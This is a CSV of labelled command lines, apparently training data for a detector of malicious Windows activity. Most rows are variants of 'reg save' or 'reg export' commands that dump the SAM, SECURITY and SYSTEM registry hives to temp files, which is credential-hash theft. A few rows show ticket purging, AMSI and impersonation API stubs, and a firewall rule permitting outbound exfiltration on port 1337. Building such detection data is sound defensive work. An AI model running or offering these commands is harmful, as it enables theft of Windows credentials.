text,label
"powershell -nop -c ""reg save hklm\sam c:\temp\ikdeb6hw.dat""",1
reg export hklm\system c:\windows\temp\4952otc0.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\0uovx7wl.dat""",1
reg save hklm\sam c:\windows\temp\tryy8xjm.save,1
"cmd.exe  /c  ""reg  save  hklm\security  c:\temp\po8iliru.dat""",1
reg save hklm\sam c:\windows\temp\op3pucpz.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\45a0jzhy.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\3nhyd0ol.dat""",1
"cmd.exe   /c   ""reg   export   hklm\sam   c:\temp\y7v3rc8i.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\6hkzqk2y.dat""",1
reg save hklm\system c:\windows\temp\cn7134qd.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\74a9nzf7.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\gqr9hg1j.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\shmunge3.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\flgjt62f.dat""",1
reg save hklm\sam c:\windows\temp\gv5gt1ax.save,1
"powershell -nop -c ""reg  save  hklm\sam  c:\windows\temp\31ak61hy.save""",1
reg  save  hklm\security  c:\windows\temp\b53lyhnx.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\1ewalqxs.dat""",1
reg save hklm\system c:\windows\temp\llso1li2.save,1
reg save hklm\sam c:\windows\temp\zb02enf5.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\ekoyxq0p.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\t7kg638d.dat""",1
"cmd.exe /c ""powershell  -nop  -c  ""reg  save  hklm\sam  c:\temp\h25gw3ix.dat""""",1
"cmd.exe /c ""reg export hklm\security c:\temp\dc7e11f7.dat""",1
"powershell  -nop  -c  ""reg  save  hklm\sam  c:\temp\ozfphdkj.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\yzflnbl0.dat""",1
reg export hklm\system c:\windows\temp\az97reqj.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\ea4kge00.dat""",1
reg export hklm\security c:\windows\temp\fkmnuohz.save,1
reg save hklm\sam c:\windows\temp\wmdkv0x0.save,1
reg save hklm\system c:\windows\temp\0yu9wved.save,1
reg export hklm\sam c:\windows\temp\u76ftj20.save,1
reg save hklm\system c:\windows\temp\er52e10i.save,1
reg export hklm\system c:\windows\temp\8ohk62l5.save,1
reg export hklm\security c:\windows\temp\9oshpj9n.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\m3n0gpia.dat""",1
reg export hklm\sam c:\windows\temp\cj5nsb2o.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\9q2tywg2.dat""",1
reg save hklm\system c:\windows\temp\fw5u5ss5.save,1
"cmd.exe  /c  ""reg  export  hklm\sam  c:\temp\v8x78wfj.dat""",1
"powershell  -nop  -c  ""reg  export  hklm\sam  c:\temp\0ypwju6u.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\9yt5lcqq.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\jsm6jvsz.dat""",1
reg export hklm\sam c:\windows\temp\so0uf63b.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\qinaqt8c.dat""",1
reg export hklm\system c:\windows\temp\vng1xouq.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\ov0ngrjy.dat""",1
reg save hklm\system c:\windows\temp\jas4egs1.save,1
"powershell  -nop  -c  ""reg  save  hklm\sam  c:\temp\9taxikw5.dat""",1
reg save hklm\sam c:\windows\temp\ljsstpnu.save,1
reg export hklm\sam c:\windows\temp\uo4p6r9a.save,1
"cmd.exe /c ""reg  save  hklm\system  c:\windows\temp\vqo2tq5q.save""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\esj8uvb1.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\p3gmzs39.dat""",1
reg save hklm\system c:\windows\temp\5mlmly7n.save,1
reg save hklm\security c:\windows\temp\juh6aprw.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\r5pz2bwm.dat""",1
reg save hklm\sam c:\windows\temp\t3d077w6.save,1
reg save hklm\system c:\windows\temp\f6e1iu3z.save,1
reg save hklm\sam c:\windows\temp\m74hz50e.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\mf8tl7f2.dat""",1
"cmd.exe /c ""reg  export  hklm\sam  c:\windows\temp\3phcnwac.save""",1
reg save hklm\sam c:\windows\temp\73kxb2tq.save,1
reg export hklm\sam c:\windows\temp\5fqrek7q.save,1
reg  export  hklm\system  c:\windows\temp\fs3o6593.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\7ssd2g6v.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\22wm7yrb.dat""",1
reg save hklm\security c:\windows\temp\53hrqo7g.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\pvn4d395.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\vbl0z0bn.dat""",1
reg save hklm\system c:\windows\temp\88ew2npm.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\j4yk5yj0.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\jiyjjhp5.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\409wn3zu.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\7biq1esc.dat""",1
reg export hklm\sam c:\windows\temp\r1zc45bb.save,1
reg export hklm\security c:\windows\temp\9617a74j.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\f0ih0dzy.dat""",1
reg save hklm\system c:\windows\temp\i3xqrefz.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\99inkdmx.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\kua8h6hb.dat""",1
reg save hklm\system c:\windows\temp\kawgehuc.save,1
reg export hklm\security c:\windows\temp\kfnyx5lm.save,1
reg save hklm\security c:\windows\temp\io9zfmx3.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\o1soxq4i.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\xgqqem7n.dat""",1
reg export hklm\system c:\windows\temp\6takbrq4.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\wmqb3eas.dat""",1
reg save hklm\sam c:\windows\temp\jwnjl37e.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\3o6qxlwv.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\167vfh1b.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\bcvcb32u.dat""",1
reg  save  hklm\sam  c:\windows\temp\zvxjipo4.save,1
reg   export   hklm\system   c:\windows\temp\jtqzmpgb.save,1
reg save hklm\system c:\windows\temp\ip636s8u.save,1
reg export hklm\system c:\windows\temp\a38f5roj.save,1
"powershell  -nop  -c  ""reg  export  hklm\sam  c:\temp\981jbvut.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\hyj2lirw.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\rw8xu9vo.dat""",1
reg export hklm\security c:\windows\temp\0baz5bft.save,1
reg save hklm\sam c:\windows\temp\dfnrq475.save,1
reg export hklm\security c:\windows\temp\w1it2377.save,1
reg save hklm\security c:\windows\temp\ifz7c8g7.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\070wycmx.dat""",1
reg save hklm\sam c:\windows\temp\yu13nwho.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\58220fe7.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\chfond8x.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\s84717zw.dat""",1
"cmd.exe /c ""reg   export   hklm\sam   c:\windows\temp\02yz8iyo.save""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\457tob6m.dat""",1
reg save hklm\security c:\windows\temp\7g3345j3.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\p58sh4lr.dat""",1
reg   save   hklm\system   c:\windows\temp\njc457jl.save,1
reg export hklm\system c:\windows\temp\lgp4i02l.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\5mowpv4k.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\yyj2n8l2.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\15nz4k7l.dat""",1
reg save hklm\security c:\windows\temp\9sbt15nk.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\cnpwl9cq.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\ex72cg7j.dat""",1
reg  export  hklm\system  c:\windows\temp\gmtzmunf.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\aoba8fp3.dat""",1
"cmd.exe   /c   ""reg   export   hklm\sam   c:\temp\f1tyrhex.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\oyd53aly.dat""",1
reg export hklm\sam c:\windows\temp\xqa8h4ov.save,1
reg save hklm\security c:\windows\temp\gq5te4pq.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\20r0ma2q.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\kdsz74vt.dat""",1
reg export hklm\system c:\windows\temp\4tcg9mbj.save,1
"cmd.exe /c ""reg save hklm\security c:\windows\temp\sdqgs3q1.save""",1
reg export hklm\sam c:\windows\temp\g5xadxbb.save,1
reg export hklm\security c:\windows\temp\g8w5d8l4.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\3vlgx0zj.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\9g8myuka.dat""",1
reg export hklm\security c:\windows\temp\fefb2nnu.save,1
reg export hklm\sam c:\windows\temp\ywbirv83.save,1
reg save hklm\sam c:\windows\temp\gjcs88hg.save,1
reg save hklm\sam c:\windows\temp\gq64av77.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\cvjwcyq7.dat""",1
reg save hklm\sam c:\windows\temp\k5g3ot1f.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\xj41z3oc.dat""",1
reg save hklm\security c:\windows\temp\vjh5favr.save,1
reg export hklm\security c:\windows\temp\r55t3yyt.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\liw8wkhr.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\tfdlmgp8.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\99knywf1.dat""",1
reg export hklm\security c:\windows\temp\ozrbi9w2.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\g9q7amvp.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\wweego4h.dat""",1
"cmd.exe /c ""reg   save   hklm\security   c:\windows\temp\8kylbse7.save""",1
reg export hklm\security c:\windows\temp\4n15rdls.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\163tg1qw.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\nf95gpwg.dat""",1
reg  export  hklm\sam  c:\windows\temp\rtxiw4lq.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\hzvwwhsw.dat""",1
reg export hklm\system c:\windows\temp\j42psf4x.save,1
reg export hklm\security c:\windows\temp\o1jwdwi7.save,1
reg export hklm\sam c:\windows\temp\0zqolqkb.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\fx08xfsm.dat""",1
reg export hklm\system c:\windows\temp\6wimpymi.save,1
reg export hklm\system c:\windows\temp\1p00ogh0.save,1
"cmd.exe /c ""powershell  -nop  -c  ""reg  export  hklm\sam  c:\temp\9607sb3g.dat""""",1
reg save hklm\sam c:\windows\temp\wmi27frf.save,1
reg export hklm\security c:\windows\temp\ohgymo3u.save,1
reg export hklm\sam c:\windows\temp\jnuffp51.save,1
reg save hklm\security c:\windows\temp\345l5wto.save,1
reg save hklm\system c:\windows\temp\e2xeygox.save,1
reg save hklm\security c:\windows\temp\e5vd88a9.save,1
reg save hklm\security c:\windows\temp\i45kky4e.save,1
"cmd.exe /c ""cmd.exe   /c   ""reg   save   hklm\security   c:\temp\2fhgf1hc.dat""""",1
reg save hklm\security c:\windows\temp\fajbm5j1.save,1
"powershell -nop -c ""klist  purge""",3
"powershell -nop -c ""cmd.exe  /c  ""reg  save  hklm\security  c:\temp\icbxtu4e.dat""""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\6ih9c35m.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\q22zfdy2.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\091vvbh0.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\a0031xt4.dat""",1
reg save hklm\sam c:\windows\temp\3gitwmbx.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\zlja89tb.dat""",1
"cmd.exe /c ""cmd.exe   /c   ""reg   save   hklm\security   c:\temp\n2pp5yrc.dat""""",1
"cmd.exe /c ""reg export hklm\security c:\temp\x27upvx6.dat""",1
reg export hklm\system c:\windows\temp\xy61pgfh.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\dbdzv60v.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\3pvppbag.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\yzo6j9jt.dat""",1
reg save hklm\system c:\windows\temp\wnwlr7wl.save,1
reg export hklm\sam c:\windows\temp\axn044ih.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\ep7qiwe8.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\q8xexhs0.dat""",1
"powershell -nop -c ""[dllimport(""advapi32.dll"")]  extern  bool  amsiutils(...)""",3
reg save hklm\system c:\windows\temp\s3d02y57.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\jznkdzb8.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\l5pzq7h5.dat""",1
"powershell  -nop  -c  ""reg  export  hklm\security  c:\temp\9wrlpeb7.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\dm0yilyt.dat""",1
"cmd.exe /c ""powershell  -nop  -c  ""reg  save  hklm\security  c:\temp\lyjh0b88.dat""""",1
"powershell -nop -c ""reg export hklm\security c:\temp\1wo1bfsn.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\ufiwmwp4.dat""",1
reg export hklm\sam c:\windows\temp\rjcneug2.save,1
"powershell -nop -c ""reg  export  hklm\security  c:\windows\temp\hkqbqjk2.save""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\arp7v7pm.dat""",1
reg export hklm\system c:\windows\temp\43d8dxw2.save,1
reg export hklm\security c:\windows\temp\hwk9slga.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\kxj48urd.dat""",1
reg export hklm\system c:\windows\temp\bqj2rkbq.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\je5qivda.dat""",1
reg export hklm\security c:\windows\temp\10g0pxl2.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\2st67g8c.dat""",1
reg export hklm\security c:\windows\temp\26lc9uky.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\o0qum5yg.dat""",1
reg   export   hklm\security   c:\windows\temp\honvy4v1.save,1
"cmd.exe   /c   ""reg   export   hklm\security   c:\temp\o5hrrtyb.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\txskrf4b.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\giorcoy1.dat""",1
reg save hklm\system c:\windows\temp\jx0zg2aw.save,1
reg save hklm\system c:\windows\temp\vwar2akt.save,1
reg save hklm\security c:\windows\temp\wnqrrh8g.save,1
"powershell -nop -c ""powershell   -nop   -c   ""reg   export   hklm\security   c:\temp\3hy2f5o7.dat""""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\xwuy155x.dat""",1
reg save hklm\security c:\windows\temp\58sxc8n4.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\d6giag7k.dat""",1
reg save hklm\system c:\windows\temp\7ryoc802.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\aagvy5bp.dat""",1
reg save hklm\security c:\windows\temp\57pq6ubc.save,1
reg save hklm\system c:\windows\temp\nfupqhwb.save,1
reg save hklm\system c:\windows\temp\14gtxrt7.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\5rypfo3q.dat""",1
reg  export  hklm\sam  c:\windows\temp\jrkzi15z.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\h33rs2nv.dat""",1
reg export hklm\security c:\windows\temp\v6c4yy1l.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\n9bty42n.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\zpa37i6a.dat""",1
reg export hklm\system c:\windows\temp\pre26agi.save,1
"powershell -nop -c ""cmd.exe  /c  ""reg  export  hklm\sam  c:\temp\1uj2a3p6.dat""""",1
reg save hklm\system c:\windows\temp\ojkkjzul.save,1
reg export hklm\sam c:\windows\temp\0wvyzldx.save,1
reg export hklm\system c:\windows\temp\jlnbvvkn.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\s71yoczi.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\oq1iadql.dat""",1
reg save hklm\system c:\windows\temp\j04m3o0m.save,1
reg export hklm\sam c:\windows\temp\1jgm65co.save,1
reg  save  hklm\system  c:\windows\temp\c1tyalz9.save,1
"cmd.exe   /c   ""reg   export   hklm\security   c:\temp\tx24wnym.dat""",1
reg export hklm\security c:\windows\temp\nz0ky6im.save,1
rule:   exfil   data   |   app:   any   |   dir:   outbound   |   act:   allow   |   port:   1337,2
"cmd.exe /c ""reg export hklm\security c:\temp\4rzxrljv.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\4if75na0.dat""",1
reg export hklm\system c:\windows\temp\kjldm1r0.save,1
reg export hklm\system c:\windows\temp\6ce54fpx.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\pv5dy5da.dat""",1
"powershell -nop -c ""cmd.exe   /c   ""reg   export   hklm\security   c:\temp\fk3ohijt.dat""""",1
reg save hklm\system c:\windows\temp\9md9vs4m.save,1
reg export hklm\security c:\windows\temp\skvrbejp.save,1
reg export hklm\sam c:\windows\temp\067zkmyl.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\iu65xcc9.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\53cgjh6w.dat""",1
reg export hklm\security c:\windows\temp\0bm9ruev.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\mynsowmr.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\a7356s4p.dat""",1
reg save hklm\security c:\windows\temp\jedi0h32.save,1
reg save hklm\sam c:\windows\temp\p3m8yg23.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\h4fy324p.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\5kc6rjeq.dat""",1
reg save hklm\system c:\windows\temp\6ubed0te.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\eq06di7a.dat""",1
reg   export   hklm\security   c:\windows\temp\chj6yj62.save,1
"powershell -nop -c ""reg save hklm\security c:\windows\temp\2yhomexa.save""",1
reg export hklm\security c:\windows\temp\u6ad5ril.save,1
"cmd.exe /c ""[dllimport(""advapi32.dll"")]   extern   bool   impersonateloggedonuser(...)""",3
reg export hklm\security c:\windows\temp\zqd1icgl.save,1
reg export hklm\sam c:\windows\temp\n4a9sm0x.save,1
reg  export  hklm\system  c:\windows\temp\8o0cj2pq.save,1
reg export hklm\security c:\windows\temp\p4tuasd7.save,1
reg export hklm\security c:\windows\temp\yfh02dqz.save,1
reg save hklm\security c:\windows\temp\8tvqmmvt.save,1
reg export hklm\security c:\windows\temp\xmt7cxj2.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\d0onqhad.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\kmeouylh.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\b55gz6w4.dat""",1
reg export hklm\sam c:\windows\temp\sds0dx5z.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\8l21rfc2.dat""",1
reg save hklm\sam c:\windows\temp\jfli7vcz.save,1
reg save hklm\security c:\windows\temp\t2zo7n36.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\300sxdzg.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\1ndqwvrg.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\gbjody8l.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\0xolzxq7.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\hhl2l2ej.dat""",1
reg save hklm\security c:\windows\temp\jxtnn976.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\oj7cwhn9.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\zp27ht8p.dat""",1
reg   save   hklm\security   c:\windows\temp\6zw4y6na.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\86mgfkau.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\pja9dgpb.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\cg33aji4.dat""",1
reg export hklm\system c:\windows\temp\hpeqm9al.save,1
"powershell -nop -c ""reg save hklm\sam c:\windows\temp\b096jdtm.save""",1
"cmd.exe /c ""reg   export   hklm\system   c:\windows\temp\b6nhy1qb.save""",1
"cmd.exe   /c   ""reg   save   hklm\sam   c:\temp\vk45qw3q.dat""",1
reg save hklm\security c:\windows\temp\z5sr6b5z.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\syt7ruvn.dat""",1
reg export hklm\security c:\windows\temp\0hu8j362.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\3ujivfc7.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\qtgq9pps.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\4k3nd59g.dat""",1
reg save hklm\sam c:\windows\temp\sw08bor7.save,1
reg export hklm\system c:\windows\temp\ou4h2cr0.save,1
"cmd.exe /c ""powershell -nop -c ""reg export hklm\sam c:\temp\ztzn1r1e.dat""""",1
reg save hklm\system c:\windows\temp\xckcru2u.save,1
"cmd.exe /c ""powershell   -nop   -c   ""reg   save   hklm\sam   c:\temp\dbijbryu.dat""""",1
"powershell -nop -c ""reg export hklm\security c:\temp\ni2ppglm.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\wlse4vm8.dat""",1
reg export hklm\system c:\windows\temp\khqlcums.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\1rr3r15s.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\ezw9ljr0.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\q84cf4gp.dat""",1
"powershell -nop -c ""powershell  -nop  -c  ""reg  save  hklm\security  c:\temp\fcaufol7.dat""""",1
reg save hklm\sam c:\windows\temp\yi7d1pdn.save,1
reg save hklm\security c:\windows\temp\upidzyfv.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\bqrmm2x3.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\0sbayusn.dat""",1
